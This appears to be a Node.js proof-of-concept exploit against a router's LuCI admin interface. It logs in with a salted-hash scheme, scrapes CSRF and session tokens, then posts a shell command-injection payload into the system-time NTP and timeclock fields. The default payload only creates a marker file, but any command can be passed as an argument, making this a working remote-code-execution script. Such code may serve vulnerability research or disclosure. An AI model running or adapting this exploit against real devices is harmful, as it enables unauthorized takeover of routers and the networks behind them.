
const crypto = require('crypto');
const BASE = process.argv[2] || 'http://192.168.10.1';
const PW = process.argv[3] || '<ROUTER-WEB-PASSWORD>';
const PAYLOAD = process.argv[4] || "'; touch /tmp/omo-rce-test; #";
const sha256 = s => crypto.createHash('sha256').update(s).digest('hex');
let cookies = [];
function remember(res) {
  const list = res.headers.getSetCookie ? res.headers.getSetCookie() : [];
  for (const c of list) {
    const kv = c.split(';')[0];
    const name = kv.split('=')[0];
    cookies = cookies.filter(x => !x.startsWith(name + '='));
    cookies.push(kv);
  }
}
async function req(url, opts = {}) {
  const headers = Object.assign({}, opts.headers || {}, cookies.length ? { cookie: cookies.join('; ') } : {});
  const r = await fetch(BASE + url, Object.assign({}, opts, { headers, redirect: 'manual' }));
  remember(r);
  const body = await r.text();
  return { status: r.status, headers: r.headers, body, loc: r.headers.get('location') };
}
const field = (html, name) => {
  const m = html.match(new RegExp('name="' + name + '"[^>]*value="([^"]*)"'));
  return m ? m[1] : null;
};
(async () => {
  const page = await req('/cgi-bin/luci/admin/wizard');
  const csrf = field(page.body, '_csrf'), token = field(page.body, 'token'), salt = field(page.body, 'salt');
  console.log('login page', page.status, 'csrf', !!csrf, 'token', !!token, 'salt', salt);
  const h1 = sha256(PW + salt);
  const h2 = token ? sha256(h1 + token) : h1;
  const body = new URLSearchParams({ _csrf: csrf, token, salt, zonename: 'UTC', timeclock: String(Math.floor(Date.now() / 1000)), luci_username: 'admin', luci_password: h2 });
  const login = await req('/cgi-bin/luci/admin/wizard', { method: 'POST', headers: { 'content-type': 'application/x-www-form-urlencoded' }, body });
  console.log('login post', login.status, 'loc', login.loc, 'cookies', JSON.stringify(cookies));
  const sys = await req('/cgi-bin/luci/admin/system/systime');
  console.log('systime page', sys.status, 'len', sys.body.length);
  const stoken = field(sys.body, 'token') || (sys.body.match(/token['"]?\s*[:=]\s*['"]([0-9a-f]{16,})['"]/) || [])[1];
  console.log('systime token', stoken ? stoken.slice(0, 12) + '...' : null);
  const pbody = new URLSearchParams({ token: stoken, 'cbi.submit': '1', 'cbid.system.ntp.current': PAYLOAD, timeclock: PAYLOAD });
  const p = await req('/cgi-bin/luci/admin/system/systime', { method: 'POST', headers: { 'content-type': 'application/x-www-form-urlencoded' }, body: pbody });
  console.log('payload post', p.status, 'len', p.body.length, 'loc', p.loc);
})().catch(e => { console.error('ERR', e.message); process.exit(2); });

